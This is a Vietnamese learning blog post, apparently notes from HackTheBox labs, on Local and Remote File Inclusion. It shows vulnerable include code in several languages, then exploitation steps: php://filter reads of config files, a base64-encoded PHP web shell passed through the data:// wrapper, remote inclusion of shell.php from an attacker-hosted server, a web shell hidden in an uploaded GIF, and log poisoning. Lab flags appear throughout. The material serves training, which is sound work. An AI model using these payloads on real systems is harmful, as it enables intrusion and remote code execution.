---
title: Local File Inclusion
published: 2025-04-10
tags: [HTB, Pentest]
category: Learning
author: Trohan0x00
draft: flase
description: Learning about Local File Inclusion
image: "/assets/post_image/lfi.png"
---

# Research: Local File Inclusion và Remote File Inclusion
## I. Local File Inclusion là gì?
### 1. Khái niệm
![image](https://hackmd.io/_uploads/By6HXInz1l.png)
* Nhiều ngôn ngữ lập trình phía máy chủ hiện đại, chẳng hạn như `PHP, Javascript, hoặc Java`, sử dụng các tham số `HTTP` để xác định những gì sẽ được hiển thị trên trang web. Điều này cho phép xây dựng các trang web động, giảm kích thước tổng thể của tập lệnh và làm cho mã trở nên đơn giản hơn. Trong các trường hợp này, tham số được sử dụng để chỉ định tài nguyên nào sẽ được hiển thị trên trang. Nếu các chức năng này không được mã hóa an toàn, kẻ tấn công có thể thao túng các tham số này để hiển thị nội dung của bất kỳ tệp cục bộ nào trên máy chủ lưu trữ, dẫn đến lỗ hổng `Local File Inclusion (LFI)`.
* `LFI` thường xuất hiện trong các công cụ dựng giao diện `(templating engine)`. Để giúp các phần chung của ứng dụng web như tiêu đề, thanh điều hướng, và chân trang luôn giống nhau khi chuyển đổi giữa các trang, các công cụ này hiển thị những phần tĩnh đó và chỉ tải nội dung động thay đổi giữa các trang. Nếu không có công cụ này, mỗi trang trên máy chủ sẽ cần được chỉnh sửa mỗi khi có thay đổi trong các phần tĩnh.
* Ví dụ, chúng ta thường thấy một tham số như `/index.php?page=about`, trong đó `index.php` xử lý nội dung tĩnh (như tiêu đề/chân trang), và chỉ tải nội dung động được chỉ định bởi tham số page, ví dụ từ một tệp gọi là `about.php`. Nếu chúng ta kiểm soát được giá trị của page, có thể khiến ứng dụng web tải các tệp khác và hiển thị nội dung của chúng trên trang.
### 2. Ví dụ
#### PHP
* Trong `PHP`, chúng ta có thể sử dụng hàm `include()` để tải một tệp cục bộ hoặc tệp từ xa khi tải một trang. Nếu đường dẫn được truyền vào `include()` được lấy từ một tham số do người dùng kiểm soát, chẳng hạn như tham số `GET`, và nếu mã không lọc hoặc kiểm tra đầu vào của người dùng một cách rõ ràng, thì mã sẽ trở nên dễ bị tấn công bởi `File Inclusion`.
    ```php
    if (isset($_GET['language'])) {
    include($_GET['language']);
    }
    ```
* Chúng ta thấy rằng tham số `language` được truyền trực tiếp vào hàm `include()`. Do đó, bất kỳ đường dẫn nào chúng ta truyền vào tham số `language` sẽ được tải trên trang, bao gồm cả các tệp cục bộ trên máy chủ phía sau. Điều này không chỉ giới hạn ở hàm `include()`, vì còn nhiều hàm `PHP` khác cũng có thể dẫn đến lỗ hổng tương tự nếu chúng ta có quyền kiểm soát đường dẫn được truyền vào. Các hàm đó bao gồm `include_once()`, `require()`, `require_once()`, `file_get_contents()` và nhiều hàm khác.
#### NodeJS
* Cũng giống như `PHP`, các máy chủ web `NodeJS` cũng có thể tải nội dung dựa trên các tham số `HTTP`. Sau đây là một ví dụ cơ bản về cách tham số `GET language` được sử dụng để kiểm soát dữ liệu được ghi vào một trang:
    ```javascript
    if(req.query.language) {
  fs.readFile(path.join(__dirname,req.query.language),function (err, data) {
        res.write(data);
    });
    }
    ```
* Như chúng ta thấy, bất kỳ tham số nào được truyền từ `URL` đều được sử dụng bởi hàm `readFile`, sau đó ghi nội dung của tệp vào phản hồi `HTTP`.
* Một ví dụ khác là hàm `render()` trong framework `Express.js`. Ví dụ sau đây sử dụng tham số `language` để xác định thư mục mà nó sẽ lấy tệp `about.html`:
    ```javascript
    app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
    });
    ```
* Không giống như các ví dụ trước đó, nơi tham số `GET` được chỉ định sau ký tự (?) trong `URL`, ví dụ trên lấy tham số từ đường dẫn URL (ví dụ: `/about/en hoặc /about/es`). Vì tham số được sử dụng trực tiếp trong hàm `render()` để chỉ định tệp được kết xuất, chúng ta có thể thay đổi `URL` để hiển thị tệp khác.
#### Java
* Cùng một khái niệm cũng áp dụng cho nhiều máy chủ web khác. Các ví dụ sau đây cho thấy cách các ứng dụng web cho máy chủ Java có thể bao gồm các tệp cục bộ dựa trên tham số được chỉ định, sử dụng hàm include:
    ```java
    <c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language')%>" />
    </c:if>
    ```
* Hàm `include` có thể lấy một tệp hoặc một `URL` trang làm tham số và sau đó hiển thị đối tượng này vào giao diện phía trước, tương tự như các ví dụ trước đó với `NodeJS`. Hàm import cũng có thể được sử dụng để kết xuất một tệp cục bộ hoặc một `URL`, chẳng hạn như ví dụ sau:
    ```java
    <c:import url="<%= request.getParameter('language') %>"/>
    ```
#### .NET
* Cuối cùng, hãy xem một ví dụ về cách các lỗ hổng `File Inclusion` có thể xuất hiện trong các ứng dụng web `.NET`. Hàm `Response.WriteFile` hoạt động rất giống với tất cả các ví dụ trước đó, vì nó lấy đường dẫn tệp làm đầu vào và ghi nội dung của tệp đó vào phản hồi. Đường dẫn có thể được lấy từ tham số GET để tải nội dung động, như sau:
    ```csharp
    @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<%HttpContext.Request.Query['language'] %>"); %> 
    }
    ```
* Hơn nữa, hàm ``@Html.Partial()` cũng có thể được sử dụng để kết xuất tệp được chỉ định như một phần của giao diện phía trước, tương tự như những gì chúng ta đã thấy trước đó:
    ```csharp
    @Html.Partial(HttpContext.Request.Query['language'])
    ```
* Cuối cùng, hàm `include` cũng có thể được sử dụng để kết xuất các tệp cục bộ hoặc `URL` từ xa, và cũng có thể thực thi các tệp được chỉ định:
    ```csharp
    <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
    ```
### 3. Hậu quả
* Rò rỉ mã nguồn: Kẻ tấn công có thể phân tích mã để tìm các lỗ hổng khác.
* Rò rỉ dữ liệu nhạy cảm: Bao gồm các thông tin như mật khẩu, khóa truy cập, v.v.
* Thực thi mã từ xa `(Remote Code Execution - RCE)`: Trong một số điều kiện, `LFI` có thể dẫn đến việc thực thi mã trên máy chủ, làm lộ toàn bộ hệ thống.

## II. Cách khai thác
![image](https://hackmd.io/_uploads/rJrzMchz1l.png)
### 1. PHP filters
* Trước khi đi đến việc khai thác, thì ta cần biết đến `PHP filters` là gì? 
* Nhiều ứng dụng web phổ biến được phát triển bằng `PHP`, cùng với nhiều ứng dụng web tùy chỉnh sử dụng các framework `PHP` như `Laravel` hoặc `Symfony`. Khi phát hiện lỗ hổng `LFI (Local File Inclusion)` trong ứng dụng web `PHP`, chúng ta có thể tận dụng `PHP Wrappers` để mở rộng khai thác `LFI`, thậm chí có thể đạt được `remote code execution (RCE)`.
* `PHP Wrappers` cung cấp cách truy cập các luồng `I/O` khác nhau ở cấp độ ứng dụng, như đầu vào/đầu ra chuẩn, bộ mô tả tệp `(file descriptors)`, và luồng bộ nhớ `(memory streams)`.
* PHP Filters là một loại `PHP Wrapper`, cho phép chúng ta truyền các loại đầu vào khác nhau và lọc chúng theo bộ lọc đã chỉ định. Để sử dụng các luồng `PHP Wrapper`, chúng ta sử dụng cú pháp `php://`. Đối với bộ lọc, ta dùng `php://filter/`.
* Các tham số quan trọng nhất để tấn công là:
    * `resource`: Chỉ định tài nguyên cần áp dụng bộ lọc (ví dụ: tệp cục bộ).
    * `read`: Áp dụng các bộ lọc khác nhau lên tài nguyên.
* Có 4 loại bộ lọc chính:
    * Bộ lọc chuỗi `(String Filters)`.
    * Bộ lọc chuyển đổi `(Conversion Filters)`.
    * Bộ lọc nén `(Compression Filters)`.
    * Bộ lọc mã hóa `(Encryption Filters)`.
* Trong tấn công LFI, bộ lọc quan trọng nhất là `convert.base64-encode`, thuộc loại `Conversion Filters`.
#### Lab:
![image](https://hackmd.io/_uploads/HyOotqhM1l.png)
* Ta sẽ tiến hành làm một bài lab nhỏ về phần này.
![image](https://hackmd.io/_uploads/S1STuq2fkg.png)
* Trang `index.php` sẽ hiện thị thông tin như này và ta có thể chọn ngôn ngữ, khi lựa chọn ngôn ngữ thì `url` sẽ xuất hiện tham số `language` đây cũng chính là `vulnerabilty point` của ta cần phải khai thác. Để tiến hành khai thác, ban đầu mình sẽ fuzzing trước để xem thử file `config` ta cần tìm cụ thể là như nào
![image](https://hackmd.io/_uploads/ByjCKq2f1x.png)
* Ta thấy được 1 file tên là `configure.php` được redirect sang `index.php`, từ đây ta có thể dùng `php filters` để tiến hành lấy source của file này.
* Như ta đã biết, khi một file config được đưa vào `Web server`, ta sẽ không thực sự đọc đuợc source của file này một cách chính thống, do file không được render để thể hiện mã `HTML` lên `Web server`, khi đó với lỗ hỏng `LFI` và tận dụng `PHP Filters` ta có thể thực hiện encode `B64` source file này và sau đó có thể decode để đọc một cách k chính thống.
* Cụ thể mình có payload `curl -s 'http://94.237.60.154:40329/index.php?language=php://filter/read=convert.base64-encode/resource=configure'`. Như đã nói ở trên ta chỉ cần quan tâm hai tham số chính là `read` và `resoucre`. `Read` ở đây sẽ là bộ lọc `convert.base64` và `resource` sẽ là `configure.php` nhưng ta không cần phaỉ thêm `extension` 
```html
    <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Inlane Freight</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700" rel="stylesheet">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'>
    <link rel="stylesheet" href="./style.css">
</head>

<body>
    <div class="navbar">
        <a href="#home">Inlane Freight</a>
        <div class="dropdown">
            <button class="dropbtn">Language
                <i class="fa fa-caret-down"></i>
            </button>
            <div class="dropdown-content">
                <a href="index.php?language=en">English</a>
                <a href="index.php?language=es">Spanish</a>
            </div>
        </div>
    </div>
    <!-- partial:index.partial.html -->
    <div class="blog-card">
        <div class="meta">
            <div class="photo" style="background-image: url(./image.jpg)"></div>
            <ul class="details">
                <li class="author"><a href="#">John Doe</a></li>
                <li class="date">Aug. 24, 2019</li>
            </ul>
        </div>
        <div class="description">
            <h1>History</h1>
            <h2>Containers</h2>
            PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7            <p class="read-more">
                <a href="#">Read More</a>
            </p>
        </div>
    </div>
    <div class="blog-card alt">
        <div class="meta">
            <div class="photo" style="background-image: url(./image.jpg)"></div>
            <ul class="details">
                <li class="author"><a href="#">Jane Doe</a></li>
                <li class="date">July. 15, 2019</li>
            </ul>
        </div>
        <div class="description">
            <h1>Container Industry</h1>
            <h2>Opening a door to the future</h2>
            <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta
                praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p>
            <p class="read-more">
                <a href="#">Read More</a>
            </p>
        </div>
    </div>
    <!-- partial -->
</body>

</html>%   
```
* Ta thấy được ở thẻ `h2` sẽ nhận được một chuỗi base64, đó chính là chuỗi source của `configure` ta truy xuất được, ta sẽ tiến hành decode
![image](https://hackmd.io/_uploads/rkSIi93M1l.png)
* OK, đơn giản đúng chứ? Ta đã dễ dàng đọc trộm được source của file `configure.php` bằng `PHP filters` và lấy được `DB_Password = HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

### 2. PHP Wrapper
* Có nhiều phương pháp để thực thi lệnh từ xa, mỗi phương pháp có một trường hợp sử dụng cụ thể, vì chúng phụ thuộc vào ngôn ngữ/framework backend và khả năng của hàm dễ bị tổn thương. Một phương pháp dễ dàng và phổ biến để chiếm quyền điều khiển máy chủ `backend` là liệt kê thông tin đăng nhập của người dùng và các khóa `SSH`, sau đó sử dụng chúng để đăng nhập vào máy chủ `backend` thông qua `SSH` hoặc bất kỳ phiên làm việc từ xa nào khác. Ví dụ, chúng ta có thể tìm thấy mật khẩu cơ sở dữ liệu trong một tệp như `config.php`, mật khẩu này có thể giống với mật khẩu của người dùng trong trường hợp họ sử dụng lại mật khẩu. Hoặc, chúng ta có thể kiểm tra thư mục .ssh trong thư mục chính của mỗi người dùng, và nếu quyền đọc không được thiết lập đúng cách, chúng ta có thể lấy khóa riêng tư của họ `(id_rsa)` và sử dụng nó để đăng nhập `SSH` vào hệ thống.
* Ngoài các phương pháp đơn giản như vậy, còn có những cách để đạt được thực thi mã từ xa trực tiếp thông qua hàm dễ bị tổn thương mà không cần dựa vào việc liệt kê dữ liệu hay quyền tệp cục bộ. Trong phần này, chúng ta sẽ bắt đầu với việc thực thi mã từ xa trên các ứng dụng web `PHP`. Chúng ta sẽ xây dựng dựa trên những gì đã học trong phần trước, và sẽ sử dụng các `PHP Wrappers` khác nhau để đạt được thực thi mã từ xa. Sau đó, trong các phần tiếp theo, chúng ta sẽ học các phương pháp khác để đạt được thực thi mã từ xa có thể được sử dụng với `PHP` và các ngôn ngữ khác.
#### Data Wrapper
* `Data Wrapper` có thể được sử dụng để bao gồm dữ liệu bên ngoài, bao gồm cả mã `PHP`. Tuy nhiên, `Data Wrapper` chỉ khả dụng nếu thiết lập `allow_url_include` được bật trong cấu hình PHP. Vì vậy, trước tiên, chúng ta hãy xác nhận xem thiết lập này có được bật hay không bằng cách đọc tệp cấu hình PHP thông qua lỗ hổng `LFI`.
* Để làm điều này, chúng ta có thể bao gồm tệp cấu hình PHP tại đường dẫn `/etc/php/X.Y/apache2/php.ini` cho `Apache` hoặc `/etc/php/X.Y/fpm/php.ini` cho `Nginx`, trong đó `X.Y` là phiên bản `PHP` được cài đặt. Chúng ta sẽ bắt đầu với phiên bản `PHP` mới nhất và thử các phiên bản cũ hơn nếu không tìm thấy tệp cấu hình. Chúng ta cũng sẽ sử dụng bộ lọc `base64` đã sử dụng trong lab trước, vì các tệp `.ini` tương tự như tệp `.php` và nên được mã hóa để tránh bị lỗi. Cuối cùng, chúng ta sẽ sử dụng `cURL` hoặc `Burp` thay vì trình duyệt, vì chuỗi kết quả có thể rất dài và cần được ghi nhận chính xác
* Với `allow_url_include` được bật, chúng ta có thể tiếp tục với cuộc tấn công bằng `Data Wrapper`. Bước đầu tiên là mã hóa base64 một web shell `PHP` cơ bản:
    ```php
    echo '<?php system($_GET["cmd"]); ?>' | base64
    ```
* Kết quả là chuỗi base64: `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==`. Sau đó, mã hóa `URL` chuỗi `base64` này và truyền nó vào `Data Wrapper` với `data://text/plain;base64,`. Chúng ta có thể gửi lệnh thông qua tham số GET cmd:
    ```php
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
    ```
* Như thế là ta đã có thể upload một `Webshell` cơ bản với `LFI`
#### Lab: 
![image](https://hackmd.io/_uploads/B1Xxrj3zJg.png)
* Lab này giao diện cũng giống như lab trước, đầu tiên để có thể khai thác được `LFI` thì ta nên khai thác xem trang có khả năng bị `Path Traversal` hay không? 
![image](https://hackmd.io/_uploads/SJ3GSj2Gyg.png)
* Như thể với payload đơn giản ta đã xác nhận được server bị `Path traversal`. Thêm một tips kinh nghiệm để check được `Path traversal`, đó là mình sẽ cung cấp đường dẫn tuyệt đối như `/etc/passwd`. Nếu lỗ hỏng hiện thị được đường dẫn này thì có nghĩa tham số ở server không chứ `prefix` ví dụ như là `language=folder/etc/passwd` còn nếu server không hiển thị được lỗ hỏng thì khả năng cao là có `prefix` ở trước cho nên ta phải thay đôỉ payload thành `language=folder/../../../etc/passwd` để quay về đường dẫn tuyệt đối.
* OK, giờ đến lab này, ta sẽ tiến hành đọc file `php.ini` để xem `allow_url_include` có được bật hay không
    ```php
    curl "http://94.237.59.180:31240/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    ```
![image](https://hackmd.io/_uploads/HyT4Us3Myl.png)
* Ta nhận được chuỗi base64 rất dài, nên việc copy decode sẽ không khả thi nên ta cần push vào file để decode
![image](https://hackmd.io/_uploads/HkHuLjnfJx.png)
* Như vậy ta đã biết được file `php.ini` với `allow_url_include` được bật nên ta có thể hoàn toàn đưa được `Webshell` lên.
![image](https://hackmd.io/_uploads/r1Wlvj3z1l.png)
* Ta sẽ tiến hành encode b64 `Webshell` và `URL encode` nên ta được chuỗi `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D`. Từ đây, ta có thể sử dụng `Data wrapper` để tiến hành đưa `Webshell` lên và tiến hành RCE 
![image](https://hackmd.io/_uploads/BJrqDo3zJx.png)
* Ta đã có thể `RCE` từ đây có thể dùng `OS Command` để đọc được file flag ở thư mục `/`
![image](https://hackmd.io/_uploads/SJ-y_j2Mkx.png)
> HTB{d!$46l3_r3m0t3_url_!nclud3}
### 3. Remote File Inclusion (RFI)
* Khi một hàm dễ bị tấn công cho phép bao gồm các file từ xa, chúng ta có thể `host` một script độc hại và đưa nó vào trang `web` bị tấn công để thực thi các chức năng độc hại và đạt được `remote code execution (RCE)`. 
* `RFI` là một dạng mở rộng của `LFI`. Hầu hết các hàm hỗ trợ `RFI` cũng hỗ trợ `LFI`.
* Không phải tất cả `LFI` đều là `RFI`. Điều này có thể do:
Hàm không hỗ trợ bao gồm `URL` từ xa.
* Ta chỉ kiểm soát được một phần của tên `file`, không phải toàn bộ `URL` (vd: http://, ftp://, https://).
* Cấu hình server chặn `RFI` (phổ biến trong các web server hiện đại).
#### Lab: 
* Do không quá khác biệt cách khai thác với `LFI` nên mình sẽ đến luôn với phần LAB. 
![image](https://hackmd.io/_uploads/rkX7cj3z1e.png)
* Đầu tiên, để xác nhận được `Web server` có khả năng `RFI` hay không thì ta cũng cần biết được `allow_url_include` có được bật hay không
* Tiếp đó ta sẽ tạo một file `Web shell` ở local 
![image](https://hackmd.io/_uploads/Sy8O9infyx.png)
* Kế tiếp, thay vì dùng `Data wrapper` để đưa `Webshell` lên như `LFI` thì ở đây ta có thể mở một server `HTTP,FTP, hoặc SMB` để thực hiện connect từ `Webserver` đến local
![image](https://hackmd.io/_uploads/rJ1T5j2zJx.png)
* Tiếp đó ta có thể truy cập vào local ở phần `URL` của `Webserver` như sau
    ```text
    http://10.129.231.159/index.php?language=http://10.10.14.247:8080/shell.php&cmd=ls
    ```
![image](https://hackmd.io/_uploads/SkUA6ihMJe.png)
* Ta đã thành công đưa `Webshell` lên, từ giờ ta chỉ cần khai thác như các lab trước và lấy flag thôi
![image](https://hackmd.io/_uploads/HkSGRinMJl.png)


### 4. LFI và File Uploads 
* Các chức năng `upload file` là một phần không thể thiếu trong hầu hết các ứng dụng web hiện đại, vì người dùng thường cần tải lên dữ liệu để tùy chỉnh hồ sơ hoặc sử dụng ứng dụng. Tuy nhiên, đối với kẻ tấn công, khả năng tải lên file trên máy chủ backend có thể mở rộng việc khai thác các lỗ hổng, ví dụ như lỗ hổng `File Inclusion (LFI)`.
#### Tấn Công File Upload
* Phần này hướng dẫn các kỹ thuật khai thác lỗ hổng từ form upload file. Tuy nhiên, với cuộc tấn công mà chúng ta sẽ thảo luận, form upload file không nhất thiết phải bị lỗi bảo mật; chỉ cần cho phép tải file lên là đủ. Nếu chức năng bị lỗi có khả năng thực thi mã, nội dung trong file tải lên sẽ được thực thi khi file được nhúng, bất kể định dạng hay loại file.
* Ví dụ, ta có thể tải lên một file hình ảnh (ví dụ: `image.jpg`), nhưng thay vì chứa dữ liệu hình ảnh, file này chứa mã `PHP` web shell. Khi file này được nhúng qua lỗ hổng `LFI`, mã `PHP` sẽ được thực thi, dẫn đến kiểm soát từ xa `(Remote Code Execution - RCE)`.
#### LAB:
![image](https://hackmd.io/_uploads/B1reb3nG1l.png)
* Đến với lab, web server hiện tại đã có thêm một mục để upload vatar
![image](https://hackmd.io/_uploads/Hy4XWnhG1e.png)
* Để thực hiện khai thác, ta cần tạo một thẻ `jpg` hoặc `svg` hoặc bất kỳ thẻ nào là dạng hình ảnh để có thể upload và kèm theo đó sẽ inject một `payload` `webshell` vào trong
![image](https://hackmd.io/_uploads/BJgOb33MJe.png)
* Ở đây mình sẽ dùng thẻ `.gif` sau khi tạo xong ta sẽ upload `gif` lên
![image](https://hackmd.io/_uploads/r1R9bn2fkg.png)
* Ta đã upload thành công, `Ctrl+U` để có thể xem được đường dẫn nơi avatar của chúng ta được lưu trữ
![image](https://hackmd.io/_uploads/rkcnb22GJg.png)
* File của ta được lưu ở `/profile_images/default.jpg` khi ta upload thì `default.jpg` sẽ được thay bằng `shell.gif` của ta, giờ ta sẽ tiến hành `Path traversal` để đi đến đường dẫn và check thử xem đã `RCE` được hay chưa
![image](https://hackmd.io/_uploads/B1zEf22Gye.png)
* OK! Như vậy ta đã có thể `RCE` 
![image](https://hackmd.io/_uploads/SJKIznnzkg.png)
> HTB{upl04d+lf!+3x3cut3=rc3}
### 5. Log Poisoning
* Cả `Apache` và `Ngin`x` đều duy trì nhiều tệp log khác nhau, chẳng hạn như `access.log` và `error.log`. Tệp `access.log` chứa thông tin về tất cả các yêu cầu được gửi đến máy chủ, bao gồm cả trường `User-Agent` của mỗi yêu cầu. Vì chúng ta có thể kiểm soát trường `User-Agent` trong các yêu cầu của mình, nên có thể sử dụng nó để tiêm nhiễm `(poison)` các log của máy chủ như đã trình bày ở trên.
* Sau khi inject, chúng ta cần bao gồm các log thông qua lỗ hổng `LFI (Local File Inclusion)`, và để làm điều đó, chúng ta cần có quyền đọc đối với các tệp log. Mặc định, log của `Nginx` có thể được đọc bởi người dùng có quyền thấp (ví dụ như www-data), trong khi log của `Apache` chỉ có thể được đọc bởi người dùng có quyền cao (ví dụ như các nhóm root/adm). Tuy nhiên, trên các máy chủ `Apache` cũ hoặc cấu hình sai, những log này có thể có thể được đọc bởi người dùng có quyền thấp.
* Mặc định, log của `Apache` nằm trong thư mục `/var/log/apache2/` trên hệ điều hành `Linux` và trong `C:\xampp\apache\logs\` trên `Windows`, trong khi log của `Nginx` nằm trong thư mục `/var/log/nginx/` trên hệ điều hành `Linux` và trong `C:\nginx\log\` trên `Windows`. Tuy nhiên, vị trí của các log có thể khác nhau trong một số trường hợp, do đó chúng ta có thể sử dụng một danh sách từ điển `LFI` để dò tìm các vị trí này, như sẽ được trình bày trong phần tiếp theo.

#### LAB:
![image](https://hackmd.io/_uploads/r1SbI22zkl.png)
* Ta sẽ tiến hành thực hiện việc khai thác, đầu tiên để biết được `Web server` đang chạy loại nào `NGINX` hay `Apache` thì ta có thể dùng `Burp` để bắt request và phân tích hoặc cách nhanh hơn mình sẽ dùng `Wappalyzer` 
![image](https://hackmd.io/_uploads/BkzPI22M1g.png)
* Vậy là ta đã biết `Web server` đang dùng `Apache` và cụ thể là `Apache2` ta có đường dẫn đến file `log` là `/var/log/apache2/access.log`
![image](https://hackmd.io/_uploads/Syn9Ln3zyl.png)
* Bằng cách dùng `Burp` ta có thể sửa được request như sau
![image](https://hackmd.io/_uploads/HyUXP32fke.png)
* Như ta thấy, sau khi sửa lại phần tử `User-Agent` thì phần `log` được ghi ở `access.log` cũng bị thay đổi theo, từ đây ta có thể thay thành một webshell 
![image](https://hackmd.io/_uploads/S1TLFhhz1g.png)
* Giờ ta chỉ cần khai thác như các lab trước thôi :vv 

## III. Final Lab
* 